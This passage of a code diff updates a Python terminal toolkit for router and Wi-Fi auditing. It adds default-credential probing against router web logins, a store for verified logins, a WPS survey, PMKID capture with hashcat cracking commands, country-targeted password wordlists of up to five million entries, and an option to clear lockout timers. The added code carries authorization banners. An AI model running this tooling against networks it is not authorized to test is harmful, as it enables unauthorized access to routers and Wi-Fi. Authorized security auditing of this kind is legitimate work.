+        from modules.vuln_intel import enrich_device, get_seed_info
+
+        router_ip = get_router_ip()
+        last_report = None
+        advisor = SmartProbeAdvisor(db=self.db)
+
+        def _cb(line):
+            low = str(line).lower()
+            if line.startswith("[+]"):
+                con.print("[ok]{msg}[/]".format(msg=line))
+            elif "fail" in low or line.startswith("[!]"):
+                con.print("[err]{msg}[/]".format(msg=line))
+            elif line.startswith("[?]"):
+                con.print("[warn]{msg}[/]".format(msg=line))
+            else:
+                con.print("[dim]{msg}[/]".format(msg=line))
+
+        def _print_ports(ports):
+            if not ports:
+                con.print("[warn]No open management ports found[/]")
+                return
+            t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
+            t.add_column("Port", justify="right")
+            t.add_column("Scheme")
+            t.add_column("HTTP")
+            t.add_column("Server")
+            t.add_column("Title hint")
+            for p in ports:
+                t.add_row(
+                    str(p.get("port")),
+                    str(p.get("scheme") or ""),
+                    str(p.get("http_status") or ""),
+                    str(p.get("server") or "-")[:28],
+                    str(p.get("title_hint") or "-")[:32],
+                )
+            con.print(t)
+
+        def _print_fingerprint(info):
+            if not info:
+                con.print("[warn]No fingerprint data[/]")
+                return
+            t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
+            t.add_column("Key", style="dim", min_width=14)
+            t.add_column("Value", style="cyan")
+            for key in (
+                "brand", "confidence", "title", "server", "realm",
+                "port", "scheme", "http_status",
+            ):
+                if key in info and info.get(key) not in (None, ""):
+                    t.add_row(key, str(info.get(key)))
+            if info.get("model_hints"):
+                t.add_row("model_hints", ", ".join(info.get("model_hints") or []))
+            if info.get("signals"):
+                t.add_row("signals", ", ".join(info.get("signals") or [])[:80])
+            if info.get("notes"):
+                t.add_row("notes", ", ".join(info.get("notes") or []))
+            con.print(Panel(t, title="Fingerprint", border_style="cyan"))
+
+        def _print_creds(creds):
+            if not creds:
+                con.print("[warn]No credential results[/]")
+                return
+            t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
+            t.add_column("User")
+            t.add_column("Pass")
+            t.add_column("Status")
+            t.add_column("Conf")
+            t.add_column("Reason")
+            for c in creds:
+                status = c.get("status", "?")
+                style = {
+                    "success": "ok",
+                    "possible": "warn",
+                    "failed": "dim",
+                    "lockout": "err",
+                    "skipped": "dim",
+                }.get(status, "dim")
+                t.add_row(
+                    c.get("username") if c.get("username") != "" else "(empty)",
+                    c.get("password") if c.get("password") != "" else "(empty)",
+                    "[{s}]{st}[/]".format(s=style, st=status),
+                    str(c.get("confidence", "")),
+                    str(c.get("reason", ""))[:40],
+                )
+            con.print(t)
+            verified = [c for c in creds if c.get("status") == "success"]
+            lockouts = [c for c in creds if c.get("status") == "lockout"]
+            if verified:
+                con.print(
+                    "[ok]Verified default web login "
+                    "(this is NOT a Wi-Fi PSK).[/]"
+                )
+            elif lockouts:
+                con.print(
+                    "[err]Web UI lockout/rate-limit detected. "
+                    "Wait ~60s before more attempts (browser or tool).[/]"
+                )
+            else:
+                possible = [c for c in creds if c.get("status") == "possible"]
+                if possible:
+                    con.print(
+                        "[warn]Only possible hits — confirm manually in a browser.[/]"
+                    )
+                elif any(c.get("reason") == "same_as_baseline" for c in creds):
+                    con.print(
+                        "[dim]Responses matched the unauthenticated page — "
+                        "defaults not accepted (or Basic Auth ignored).[/]"
+                    )
+
+        def _save_report(report):
+            nonlocal last_report
+            last_report = report
+            try:
+                audit_id = self.db.save_router_audit(report)
+                con.print(
+                    "[ok]Saved router audit id={aid}[/]".format(aid=audit_id)
+                )
+            except Exception as exc:
+                con.print(
+                    "[warn]DB save failed: {err}[/]".format(err=str(exc))
+                )
+            # Also write JSON snapshot under reports/
+            try:
+                from pathlib import Path as _Path
+                from config import REPORTS_DIR
+                REPORTS_DIR.mkdir(parents=True, exist_ok=True)
+                fname = "router_audit_{ip}_{ts}.json".format(
+                    ip=str(report.get("ip", "target")).replace(".", "_"),
+                    ts=datetime.now().strftime("%Y%m%d_%H%M%S"),
+                )
+                path = REPORTS_DIR / fname
+                with open(path, "w", encoding="utf-8") as handle:
+                    import json as _json
+                    _json.dump(report, handle, indent=2, default=str)
+                con.print("[dim]JSON: {path}[/]".format(path=path))
+            except Exception as exc:
+                con.print(
+                    "[dim]JSON export skipped: {err}[/]".format(err=str(exc))
+                )
+
         while True:
             con.clear()
-            con.print(Rule("[hdr]Router Exploiter[/]", style="cyan"))
-
-            router_ip = get_router_ip()
-            con.print(f"\n  Router IP: [inf]{router_ip}[/]")
-
-            con.print("\n  [mn]1[/] - Scan Router Ports")
-            con.print("  [mn]2[/] - Fingerprint Router")
-            con.print("  [mn]3[/] - Try Default Credentials")
-            con.print("  [mn]4[/] - Full Exploit (scan + fingerprint + creds)")
-            con.print("  [mn]5[/] - Change Target IP")
-            con.print("  [mn]0[/] - Back\n")
+            con.print(Rule("[hdr]Router Web Audit[/]", style="cyan"))
+            con.print(
+                "[dim]Authorized testing only · default-creds are not Wi-Fi PSKs · "
+                "no exploit payloads[/]"
+            )
+            con.print(
+                "[dim]Engine: smart-probe + baseline + F680 title decode · "
+                "menu 7=vuln intel · menu 8=lockout state[/]\n"
+            )
+            con.print("  Target IP: [inf]{ip}[/]".format(ip=router_ip))
+            # Live smart status strip
+            try:
+                st = advisor.evaluate(router_ip, brand="generic")
+                if not st.get("allowed"):
+                    con.print(
+                        "[err]Probe status: LOCKED/WAIT {sec}s "
+                        "(until {until})[/]".format(
+                            sec=st.get("wait_seconds"),
+                            until=st.get("unlock_at") or "?",
+                        )
+                    )
+                else:
+                    con.print("[dim]Probe status: ready — {msg}[/]".format(
+                        msg=st.get("human", "")[:90]
+                    ))
+            except Exception:
+                pass
+            try:
+                seed = get_seed_info()
+                con.print(
+                    "[dim]Vuln seed: {ver} ({n} families)[/]".format(
+                        ver=seed.get("version"), n=seed.get("entries")
+                    )
+                )
+            except Exception:
+                pass
+            con.print("\n  [mn]1[/] Scan management ports")
+            con.print("  [mn]2[/] Fingerprint router")
+            con.print("  [mn]3[/] Probe default credentials (Basic Auth, smart)")
+            con.print("  [mn]4[/] Full audit (+ vuln intel + smart probe)")
+            con.print("  [mn]5[/] Change target IP")
+            con.print("  [mn]6[/] View saved audits")
+            con.print("  [mn]7[/] Vuln intel lookup (NVD/Exploit-DB refs)")
+            con.print("  [mn]8[/] Probe state / clear lockout timer")
+            con.print("  [mn]0[/] Back\n")
 
             ch = Prompt.ask("Select", default="0")
             if ch == "0":
                 break
 
-            elif ch == "1":
-                con.print(f"\n[inf]Scanning {router_ip}...[/]")
-                exp = RouterExploiter(router_ip)
-                ports = exp.scan_ports()
-                if ports:
-                    for p in ports:
-                        con.print(f"  [ok]Port {p['port']} OPEN[/] ({p['server']})")
-                else:
-                    con.print("[warn]No open ports found[/]")
-                Prompt.ask("\n[dim]Enter[/]")
-
-            elif ch == "2":
-                exp = RouterExploiter(router_ip)
-                exp.scan_ports()
-                con.print("\n[inf]Fingerprinting...[/]")
-                info = exp.fingerprint()
-                if info:
-                    for k, v in info.items():
-                        con.print(f"  {k}: [cyan]{v}[/]")
-                else:
-                    con.print("[warn]Could not identify router[/]")
-                Prompt.ask("\n[dim]Enter[/]")
-
-            elif ch == "3":
-                exp = RouterExploiter(router_ip)
-                exp.scan_ports()
-                exp.fingerprint()
-                brand = exp.router_info.get("brand", "generic")
-                con.print(f"  Brand: [cyan]{brand}[/]")
-                con.print("\n[inf]Trying default credentials...[/]")
-                creds = exp.try_default_creds()
-                if creds:
-                    for c in creds:
-                        con.print(f"  [ok]{c['username']}:{c['password']} ({c['method']})[/]")
-                else:
-                    con.print("[warn]No default credentials worked[/]")
-                Prompt.ask("\n[dim]Enter[/]")
-
-            elif ch == "4":
-                con.print(f"\n[hdr]Full Exploit on {router_ip}[/]\n")
-                exp = RouterExploiter(router_ip)
-
-                con.print("[dim]1. Scanning ports...[/]")
-                ports = exp.scan_ports()
-                con.print(f"  Found {len(ports)} open ports\n")
-
-                con.print("[dim]2. Fingerprinting...[/]")
-                info = exp.fingerprint()
-                brand = info.get("brand", "Unknown")
-                con.print(f"  Brand: {brand}\n")
-
-                con.print("[dim]3. Trying default credentials...[/]")
-                creds = exp.try_default_creds()
-
-                if creds:
-                    con.print("\n[ok]DEFAULT CREDENTIALS FOUND![/]")
-                    for c in creds:
-                        con.print(f"  [ok]{c['username']}:{c['password']}[/]")
-                else:
-                    con.print("[warn]No default credentials worked[/]")
-
-                Prompt.ask("\n[dim]Enter[/]")
-
             elif ch == "5":
-                router_ip = Prompt.ask("Router IP", default=router_ip)
-                con.print(f"[ok]Target: {router_ip}[/]")
-                time.sleep(1)
+                candidate = Prompt.ask("Router IP", default=router_ip)
+                ok, value = validate_target_ip(candidate)
+                if not ok:
+                    con.print("[err]{msg}[/]".format(msg=value))
+                    Prompt.ask("\n[dim]Enter[/]")
+                    continue
+                router_ip = value
+                con.print("[ok]Target set: {ip}[/]".format(ip=router_ip))
+                time.sleep(0.8)
+
+            elif ch == "6":
+                rows = self.db.get_router_audits(30)
+                if not rows:
+                    con.print("[warn]No saved router audits yet.[/]")
+                else:
+                    t = Table(box=box.ROUNDED, show_header=True,
+                              header_style="bold cyan")
+                    t.add_column("ID", width=4)
+                    t.add_column("IP")
+                    t.add_column("Brand")
+                    t.add_column("Conf")
+                    t.add_column("Auth")
+                    t.add_column("When")
+                    t.add_column("Summary")
+                    for row in rows:
+                        t.add_row(
+                            str(row["id"]),
+                            str(row["target_ip"] or ""),
+                            str(row["brand"] or "?"),
+                            str(row["confidence"] or 0),
+                            str(row["auth_status"] or ""),
+                            str(row["started_at"] or "")[:16],
+                            str(row["summary"] or "")[:36],
+                        )
+                    con.print(t)
+                Prompt.ask("\n[dim]Enter[/]")
+
+
+            elif ch == "7":
+                con.print(Rule("[hdr]Vulnerability Intelligence[/]", style="cyan"))
+                seed = get_seed_info()
+                con.print(
+                    "Offline seed: [inf]{ver}[/] ({n} families)".format(
+                        ver=seed.get("version"), n=seed.get("entries")
+                    )
+                )
+                vendor = Prompt.ask("Vendor (optional)", default="ZTE")
+                model = Prompt.ask("Model (optional)", default="F680")
+                online = Confirm.ask(
+                    "Query NVD online now? (internet + rate limits)", default=False
+                )
+                with con.status("[ok]Looking up references...[/]", spinner="dots"):
+                    report = enrich_device(
+                        vendor=vendor or None,
+                        model=model or None,
+                        online=online,
+                        limit=15,
+                    )
+                try:
+                    self.db.save_vuln_lookup(report)
+                except Exception:
+                    pass
+                cves = report.get("cves") or []
+                if not cves:
+                    con.print("[warn]No curated/online CVE rows for this query.[/]")
+                else:
+                    t = Table(box=box.ROUNDED, show_header=True,
+                              header_style="bold cyan")
+                    t.add_column("CVE")
+                    t.add_column("Sev")
+                    t.add_column("Source")
+                    t.add_column("Summary")
+                    for cve in cves[:15]:
+                        t.add_row(
+                            str(cve.get("cve_id") or ""),
+                            str(cve.get("severity") or ""),
+                            str(cve.get("source") or ""),
+                            str(cve.get("summary") or "")[:60],
+                        )
+                    con.print(t)
+                links = report.get("search_links") or {}
+                con.print("[dim]NVD search: {u}[/]".format(u=links.get("nvd")))
+                con.print("[dim]Exploit-DB: {u}[/]".format(u=links.get("exploit_db")))
+                con.print(
+                    "[warn]Reference links only. This tool does not download "
+                    "or run exploit payloads.[/]"
+                )
+                Prompt.ask("\n[dim]Enter[/]")
+
+            elif ch == "8":
+                con.print(Rule("[hdr]Smart probe state[/]", style="cyan"))
+                decision = advisor.evaluate(router_ip, brand="generic")
+                state = decision.get("state") or {}
+                t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
+                t.add_column("K", style="dim")
+                t.add_column("V", style="cyan")
+                t.add_row("target", router_ip)
+                t.add_row("allowed", str(decision.get("allowed")))
+                t.add_row("reason", str(decision.get("reason")))
+                t.add_row("wait_seconds", str(decision.get("wait_seconds")))
+                t.add_row("unlock_at", str(decision.get("unlock_at")))
+                t.add_row("human", str(decision.get("human")))
+                for key in (
+                    "brand", "attempts_in_window", "total_attempts",
+                    "last_attempt_at", "last_auth_status", "lockout_until",
+                    "lockout_count", "verified_at",
+                ):
+                    if state.get(key) not in (None, ""):
+                        t.add_row(key, str(state.get(key)))
+                con.print(Panel(t, title="Probe memory", border_style="cyan"))
+                if not decision.get("allowed"):
+                    if Confirm.ask("Clear lockout timer for this IP?", default=False):
+                        self.db.clear_probe_lockout(router_ip)
+                        con.print("[ok]Cleared lockout_until[/]")
+                Prompt.ask("\n[dim]Enter[/]")
+
+            elif ch in ("1", "2", "3", "4"):
+                ok, value = validate_target_ip(router_ip)
+                if not ok:
+                    con.print("[err]Invalid target: {msg}[/]".format(msg=value))
+                    Prompt.ask("\n[dim]Enter[/]")
+                    continue
+                router_ip = value
+
+                # Manual confirmation before any network activity
+                action_labels = {
+                    "1": "TCP/HTTP port scan",
+                    "2": "Fingerprint (port scan if needed + HTTP read)",
+                    "3": "Default credential Basic Auth probe",
+                    "4": "Full audit (scan + fingerprint + optional creds)",
+                }
+                smart_line = "Probe policy: smart (ZTE/Huawei max 3, delay 1.5s, lockout ~60s)"
+                if ch in ("3", "4"):
+                    # Show real policy, not a misleading pre-fingerprint count
+                    zte = policy_for_brand("ZTE")
+                    gen = policy_for_brand("generic")
+                    smart_line = (
+                        "Smart Basic Auth budget: ZTE/Huawei max {z} · "
+                        "generic max {g} · auto-stop on lockout/baseline"
+                    ).format(z=zte["max_attempts"], g=gen["max_attempts"])
+
+                con.print(Panel(
+                    "Target: [inf]{ip}[/]\n"
+                    "Action: {action}\n"
+                    "{smart}\n"
+                    "[warn]Only test systems you own / have permission for.\n"
+                    "You must restart from this project folder after updates.[/]".format(
+                        ip=router_ip,
+                        action=action_labels[ch],
+                        smart=smart_line if ch in ("3", "4") else "No credential probe in this action",
+                    ),
+                    title="Confirm",
+                    border_style="yellow",
+                ))
+                if not Confirm.ask("Proceed?", default=False):
+                    continue
+
+                exp = RouterExploiter(router_ip, callback=_cb, db=self.db)
+
+                if ch == "1":
+                    with con.status("[ok]Scanning ports...[/]", spinner="dots"):
+                        ports = exp.scan_ports()
+                    _print_ports(ports)
+                    report = {
+                        "ip": router_ip,
+                        "started_at": datetime.now().isoformat(timespec="seconds"),
+                        "finished_at": datetime.now().isoformat(timespec="seconds"),
+                        "steps": ["tcp_port_scan"],
+                        "open_ports": ports,
+                        "fingerprint": {},
+                        "credentials": [],
+                        "auth_status": "skipped",
+                        "summary": "Port scan only ({n} open)".format(n=len(ports)),
+                        "warnings": ["Authorized testing only"],
+                    }
+                    if Confirm.ask("Save this scan?", default=True):
+                        _save_report(report)
+                    Prompt.ask("\n[dim]Enter[/]")
+
+                elif ch == "2":
+                    with con.status("[ok]Scanning + fingerprint...[/]", spinner="dots"):
+                        exp.scan_ports()
+                        info = exp.fingerprint()
+                    _print_ports(exp.open_ports)
+                    _print_fingerprint(info)
+                    report = {
+                        "ip": router_ip,
+                        "started_at": datetime.now().isoformat(timespec="seconds"),
+                        "finished_at": datetime.now().isoformat(timespec="seconds"),
+                        "steps": ["tcp_port_scan", "fingerprint"],
+                        "open_ports": exp.open_ports,
+                        "fingerprint": info,
+                        "credentials": [],
+                        "auth_status": "skipped",
+                        "summary": "Fingerprint {brand} conf={conf}".format(
+                            brand=info.get("brand"),
+                            conf=info.get("confidence"),
+                        ),
+                        "warnings": ["Authorized testing only"],
+                    }
+                    if Confirm.ask("Save fingerprint report?", default=True):
+                        _save_report(report)
+                    Prompt.ask("\n[dim]Enter[/]")
+
+                elif ch == "3":
+                    with con.status("[ok]Preparing target...[/]", spinner="dots"):
+                        exp.scan_ports()
+                        info = exp.fingerprint()
+                    _print_fingerprint(info)
+                    brand = info.get("brand") or "generic"
+                    plan = exp.get_smart_plan(brand=brand)
+                    decision = plan.get("decision") or {}
+                    planned = build_cred_list(
+                        brand, True, int(plan.get("max_attempts") or 3)
+                    )
+                    plan_text = (
+                        "{human}\n"
+                        "Brand policy: max={maxa} delay={delay}s lockout~{lock}s\n"
+                        "Planned pairs: {n}"
+                    ).format(
+                        human=decision.get("human", ""),
+                        maxa=plan.get("max_attempts"),
+                        delay=plan.get("delay"),
+                        lock=plan.get("lockout_pause"),
+                        n=len(planned),
+                    )
+                    con.print(Panel(
+                        plan_text,
+                        title="Smart probe plan",
+                        border_style="yellow",
+                    ))
+                    if not decision.get("allowed", True):
+                        con.print(
+                            "[err]Blocked until {until} ({sec}s)[/]".format(
+                                until=decision.get("unlock_at"),
+                                sec=decision.get("wait_seconds"),
+                            )
+                        )
+                        if Confirm.ask("Clear lockout timer anyway?", default=False):
+                            self.db.clear_probe_lockout(router_ip)
+                            con.print("[ok]Lockout timer cleared locally[/]")
+                        Prompt.ask("\n[dim]Enter[/]")
+                        continue
+                    if not Confirm.ask("Start credential probe?", default=False):
+                        continue
+                    with con.status("[ok]Probing defaults (smart)...[/]", spinner="dots"):
+                        creds = exp.try_default_creds(respect_smart_policy=True)
+                    _print_creds(creds)
+                    report = {
+                        "ip": router_ip,
+                        "started_at": datetime.now().isoformat(timespec="seconds"),
+                        "finished_at": datetime.now().isoformat(timespec="seconds"),
+                        "steps": [
+                            "tcp_port_scan",
+                            "fingerprint",
+                            "default_basic_auth_probe",
+                        ],
+                        "open_ports": exp.open_ports,
+                        "fingerprint": info,
+                        "credentials": creds,
+                        "auth_status": (
+                            "success"
+                            if any(c.get("status") == "success" for c in creds)
+                            else (
+                                "possible"
+                                if any(c.get("status") == "possible" for c in creds)
+                                else "failed"
+                            )
+                        ),
+                        "summary": "Credential probe finished",
+                        "warnings": [
+                            "Authorized testing only",
+                            "Default web login is not a Wi-Fi PSK",
+                        ],
+                    }
+                    if Confirm.ask("Save audit?", default=True):
+                        _save_report(report)
+                    # Offer vault save only for verified successes
+                    verified = [c for c in creds if c.get("status") == "success"]
+                    if verified and Confirm.ask(
+                        "Also store verified web login in credentials vault?",
+                        default=False,
+                    ):
+                        c0 = verified[0]
+                        self.db.add_credential(
+                            bssid=router_ip,
+                            essid="router-web:{ip}".format(ip=router_ip),
+                            pin=None,
+                            psk="{u}:{p}".format(
+                                u=c0.get("username") or "",
+                                p=c0.get("password") or "",
+                            ),
+                            method="Router Web Default (Basic Auth)",
+                        )
+                        con.print("[ok]Stored as method=Router Web Default[/]")
+                    Prompt.ask("\n[dim]Enter[/]")
+
+                elif ch == "4":
+                    run_creds = Confirm.ask(
+                        "Include default credential probe?", default=True
+                    )
+                    run_online = False
+                    if Confirm.ask(
+                        "Also query NVD online for CVE keywords? (needs internet)",
+                        default=False,
+                    ):
+                        run_online = True
+                    with con.status("[ok]Running full audit...[/]", spinner="dots"):
+                        report = exp.full_exploit(
+                            try_creds=run_creds,
+                            respect_smart_policy=True,
+                            include_vuln_intel=True,
+                            vuln_online=run_online,
+                        )
+                    _print_ports(report.get("open_ports") or [])
+                    _print_fingerprint(report.get("fingerprint") or {})
+                    plan = report.get("probe_plan") or {}
+                    if plan:
+                        dec = plan.get("decision") or {}
+                        con.print(Panel(
+                            str(dec.get("human") or ""),
+                            title="Smart probe",
+                            border_style="yellow",
+                        ))
+                    intel = report.get("vuln_intel") or {}
+                    cves = intel.get("cves") or []
+                    if cves:
+                        vt = Table(box=box.ROUNDED, show_header=True,
+                                   header_style="bold cyan",
+                                   title="[hdr]CVE / Exploit-DB references[/]")
+                        vt.add_column("CVE", min_width=14)
+                        vt.add_column("Sev", width=8)
+                        vt.add_column("Summary")
+                        for cve in cves[:8]:
+                            vt.add_row(
+                                str(cve.get("cve_id") or ""),
+                                str(cve.get("severity") or ""),
+                                str(cve.get("summary") or "")[:70],
+                            )
+                        con.print(vt)
+                        links = intel.get("search_links") or {}
+                        if links:
+                            con.print("[dim]NVD: {u}[/]".format(u=links.get("nvd")))
+                            con.print("[dim]Exploit-DB: {u}[/]".format(
+                                u=links.get("exploit_db")
+                            ))
+                        con.print(
+                            "[warn]References only — no payloads. "
+                            "Verify firmware before conclusions.[/]"
+                        )
+                    if run_creds:
+                        _print_creds(report.get("credentials") or [])
+                    con.print(
+                        Panel(
+                            "Auth: {auth}\nSummary: {summary}".format(
+                                auth=report.get("auth_status"),
+                                summary=report.get("summary"),
+                            ),
+                            title="Audit result",
+                            border_style="cyan",
+                        )
+                    )
+                    if Confirm.ask("Save full audit?", default=True):
+                        _save_report(report)
+                    verified = [
+                        c for c in (report.get("credentials") or [])
+                        if c.get("status") == "success"
+                    ]
+                    if verified and Confirm.ask(
+                        "Store verified web login in credentials vault?",
+                        default=False,
+                    ):
+                        c0 = verified[0]
+                        self.db.add_credential(
+                            bssid=router_ip,
+                            essid="router-web:{ip}".format(ip=router_ip),
+                            pin=None,
+                            psk="{u}:{p}".format(
+                                u=c0.get("username") or "",
+                                p=c0.get("password") or "",
+                            ),
+                            method="Router Web Default (Basic Auth)",
+                        )
+                        con.print("[ok]Stored in vault[/]")
+                    Prompt.ask("\n[dim]Enter[/]")
 
     # ═══════════════════════════════════════
     # VIEW: WORDLIST GENERATOR
@@ -2170,6 +3161,10 @@ class App:
             con.print("\n  [mn]1[/] - Generate for Specific Network")
             con.print("  [mn]2[/] - Generate for All Targets")
             con.print("  [mn]3[/] - Quick Wordlist from ESSID")
+            con.print("  [mn]4[/] - REALISTIC 500,000 (MA / 8-12 balanced)")
+            con.print("  [mn]5[/] - MEGA Morocco 5,000,000 (heavy)")
+            con.print("  [mn]6[/] - MEGA 1,000,000 quick pack")
+            con.print("  [mn]7[/] - CLI build info / attribution")
             con.print("  [mn]0[/] - Back\n")
 
             ch = Prompt.ask("Select", default="0")
@@ -2179,7 +3174,7 @@ class App:
             elif ch == "1":
                 essid = Prompt.ask("ESSID (network name)")
                 brand = Prompt.ask("Brand (TP-Link/ZTE/Huawei/etc)", default="")
-                max_w = IntPrompt.ask("Max words", default=100000)
+                max_w = IntPrompt.ask("Max words", default=250000)
 
                 con.print(f"\n[inf]Generating wordlist for '{essid}'...[/]")
                 gen = WordlistGenerator()
@@ -2251,6 +3246,7 @@ class App:
             con.print("  [mn]5[/] - Analyze Captures")
             con.print("  [mn]6[/] - List All Captures")
             con.print("  [mn]7[/] - Crack Command")
+            con.print("  [mn]8[/] - WPS survey (wash) if installed")
             con.print("  [mn]0[/] - Back\n")
 
             ch = Prompt.ask("Select", default="0")
@@ -2270,6 +3266,8 @@ class App:
                 self._list_captures()
             elif ch == "7":
                 self._crack_cmd()
+            elif ch == "8":
+                self._wash_survey()
 
     def _select_target(self, fresh_scan=False):
         """Select from a fresh radio scan, not a cumulative database list."""
@@ -2377,36 +3375,198 @@ class App:
         essid = Prompt.ask("ESSID (exact, case-sensitive)", default="Unknown")
         return bssid, essid
 
+
+    def _wash_survey(self):
+        """Optional wash-based WPS lock/version survey."""
+        con.clear()
+        con.print(Rule("[hdr]WPS Survey (wash)[/]", style="cyan"))
+        from modules.wps_survey import wash_available, survey_wps
+        if not wash_available():
+            con.print("[err]wash not installed.[/]")
+            con.print("[dim]On Kali/Debian: apt install reaver  (provides wash)[/]")
+            Prompt.ask("\n[dim]Enter[/]")
+            return
+        iface = self.cfg.get("interface", "wlan0")
+        timeout = IntPrompt.ask("Survey seconds", default=20)
+        con.print("[warn]Authorized area only. wash uses monitor-capable interface when possible.[/]")
+        if not Confirm.ask("Start wash survey?", default=True):
+            return
+        with con.status("[ok]Running wash...[/]", spinner="dots"):
+            result = survey_wps(iface, timeout=timeout)
+        if not result.get("ok") and not result.get("rows"):
+            con.print("[err]{e}[/]".format(e=result.get("error") or "wash failed"))
+            Prompt.ask("\n[dim]Enter[/]")
+            return
+        rows = result.get("rows") or []
+        con.print("[ok]{n} WPS rows[/]".format(n=len(rows)))
+        t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
+        t.add_column("BSSID")
+        t.add_column("CH")
+        t.add_column("RSSI")
+        t.add_column("WPS")
+        t.add_column("Lock")
+        t.add_column("Vendor")
+        t.add_column("ESSID")
+        for r in rows[:40]:
+            t.add_row(
+                r.get("bssid", ""),
+                str(r.get("channel", "")),
+                str(r.get("rssi", "")),
+                str(r.get("wps_version", "")),
+                str(r.get("wps_locked", "")),
+                str(r.get("vendor", ""))[:12],
+                str(r.get("essid", ""))[:18],
+            )
+            # merge into DB
+            try:
+                self.db.add_network({
+                    "bssid": r.get("bssid"),
+                    "essid": r.get("essid"),
+                    "channel": r.get("channel"),
+                    "rssi": r.get("rssi"),
+                    "has_wps": 1,
+                    "wps_locked": r.get("wps_locked"),
+                    "wps_version": r.get("wps_version"),
+                    "encryption": "WPA2",
+                    "source": "wash",
+                })
+            except Exception:
+                pass
+        con.print(t)
+        Prompt.ask("\n[dim]Enter[/]")
+
     def _capture_pmkid(self, preset_target=None):
         con.clear()
         con.print(Rule("[hdr]PMKID Capture[/]", style="cyan"))
-        con.print("[warn]A PMKID is available only when the AP includes one in M1/RSN.\n" +
-                  "Retries cannot force an AP that does not expose PMKID.[/]\n")
+        con.print(
+            "[warn]A PMKID is available only when the AP includes one in M1/RSN.\n"
+            "Retries cannot force an AP that does not expose PMKID.\n"
+            "Use hashcat mode 22000 on the saved .hc22000 file.[/]\n"
+        )
         if preset_target:
             bssid, essid = preset_target
         else:
             bssid, essid = self._select_target(fresh_scan=True)
         if not bssid:
             return
-        con.print(f"\n  Target: [inf]{essid}[/] ({bssid})\n")
+
+        saved = self.db.get_network(bssid)
+        def _sf(key, default=""):
+            if saved is None:
+                return default
+            return _get_field(saved, key, default)
+        assess_net = {
+            "bssid": bssid,
+            "essid": essid or str(_sf("essid", "Unknown") or "Unknown"),
+            "rssi": int(_sf("rssi", 0) or 0),
+            "channel": int(_sf("channel", 0) or 0),
+            "encryption": str(_sf("encryption", "WPA2") or "WPA2"),
+            "has_wps": int(_sf("has_wps", 0) or 0),
+            "wps_locked": str(_sf("wps_locked", "Unknown") or "Unknown"),
+            "wps_version": str(_sf("wps_version", "") or ""),
+            "wps_model": str(_sf("wps_model", "") or ""),
+            "wps_device": str(_sf("wps_device", "") or ""),
+        }
+        hist = history_from_db(self.db, bssid)
+        report = TargetAssessor(history=hist).assess(assess_net)
+        pb = report.get("playbook") or build_playbook(
+            {"bssid": bssid, "essid": essid, "wps_model": report.get("model"), "rssi": report.get("rssi")},
+            report,
+        )
+        sig = evaluate_signal(report.get("rssi") or 0)
+        con.print("  Target: [inf]{e}[/] ({b})".format(e=essid, b=bssid))
+        con.print("  Playbook: {p} | signal: {s}".format(p=pb.get("label"), s=sig.get("message")))
+        if sig.get("level") == "block":
+            con.print("[warn]{m}[/]".format(m=sig.get("message")))
+            if not Confirm.ask("Continue PMKID attempt anyway?", default=False):
+                return
+
+        # Optional wash lock enrichment (does not block PMKID)
+        try:
+            from modules.wps_survey import wash_available, survey_wps, lookup_bssid
+            if wash_available() and Confirm.ask("Optional: quick wash WPS survey first?", default=False):
+                iface0 = self.cfg.get("interface", "wlan0")
+                with con.status("[ok]wash survey...[/]", spinner="dots"):
+                    survey = survey_wps(iface0, timeout=15)
+                row = lookup_bssid(survey.get("rows"), bssid)
+                if row:
+                    con.print(
+                        "  wash: WPS {v} lock={l} vendor={ven}".format(
+                            v=row.get("wps_version"), l=row.get("wps_locked"), ven=row.get("vendor")
+                        )
+                    )
+                else:
+                    con.print("[dim]wash: target not listed in short survey[/]")
+        except Exception as exc:
+            con.print("[dim]wash skipped: {e}[/]".format(e=exc))
+
+        # Seed smart wordlist path for later crack
+        try:
+            cands = candidates_for_target(
+                essid=essid, bssid=bssid,
+                model=str(report.get("model") or ""),
+                manufacturer=str(report.get("manufacturer") or ""),
+                limit=30,
+            )
+            if cands:
+                from pathlib import Path as _P
+                wl = _P("/tmp/wps_toolkit_isp_candidates.txt")
+                with open(wl, "w", encoding="utf-8") as handle:
+                    for c in cands:
+                        handle.write(c["password"] + "\n")
+                con.print(
+                    "[dim]Wrote {n} offline password candidates → {p}[/]".format(
+                        n=len(cands), p=wl
+                    )
+                )
+        except Exception:
+            pass
+
+        if not Confirm.ask("Start managed PMKID capture?", default=True):
+            return
+
         iface = self.cfg.get("interface", "wlan0")
         cap = HandshakeCapture(iface)
-        cap.callback = lambda l: con.print(f"[dim]{l}[/]")
+        cap.callback = lambda l: con.print("[dim]{line}[/]".format(line=l))
         try:
-            result = cap.capture_pmkid(bssid, essid, timeout=20)
+            result = cap.capture_pmkid(bssid, essid, timeout=25, retries=2)
         except KeyboardInterrupt:
             result = {"status": "stopped"}
-        con.print(f"\n  Status: {result.get('status')}")
+
+        con.print("\n  Status: {st}".format(st=result.get("status")))
         if result.get("pmkid"):
-            con.print(f"  PMKID: [ok]{result['pmkid']}[/]")
-            con.print(f"  Crack: [cyan]hashcat -m 22000 <file> wordlist.txt[/]")
-            for f in result["files"]:
-                if 'pmkid_' in f:
-                    con.print(f"  File: [ok]{f}[/]")
+            con.print("  PMKID: [ok]{v}[/]".format(v=result["pmkid"]))
+            con.print("  Crack: [cyan]hashcat -m 22000 <file> wordlist.txt[/]")
+            for f in result.get("files") or []:
+                if "pmkid_" in f or str(f).endswith(".hc22000"):
+                    con.print("  File: [ok]{f}[/]".format(f=f))
+                    con.print(
+                        "  Tip: hashcat -m 22000 {f} /tmp/wps_toolkit_isp_candidates.txt".format(f=f)
+                    )
+            try:
+                self.db.log("pmkid", "capture", "PMKID for {b}".format(b=bssid), "info")
+            except Exception:
+                pass
         else:
             con.print("[warn]No PMKID was exposed by this AP.[/]")
-            con.print("[dim]Valid alternatives for an authorized audit: WPS testing in managed mode,\n"
-                      "or an external USB Wi-Fi adapter for a real passive handshake capture.[/]")
+            con.print(
+                "[dim]Next: passive handshake (menu 9→2) with a client you own, "
+                "or WPS path if playbook allows.[/]"
+            )
+            if pb.get("primary"):
+                con.print("[dim]Playbook primary: {p}[/]".format(p=pb.get("primary")))
+
+        try:
+            ev = write_attack_evidence(
